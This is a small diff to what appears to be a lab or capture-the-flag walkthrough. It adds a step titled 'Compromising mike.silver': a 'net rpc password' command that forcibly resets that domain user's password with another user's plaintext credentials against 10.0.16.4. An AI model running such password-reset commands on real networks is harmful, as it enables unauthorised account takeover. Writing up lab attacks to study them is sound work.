@@ -440,6 +440,11 @@ A few options here but once again ill change the users password since this is a 
 
 # Compromising `mike.silver`
 ```python
+net rpc password "mike.silver" 'Password123!' -U "dismay.hsm"/"jena.yamazaki"%'Password123!' -S "10.0.16.4"
+```
+This changed the users password
+
+```python
 
 ```
 
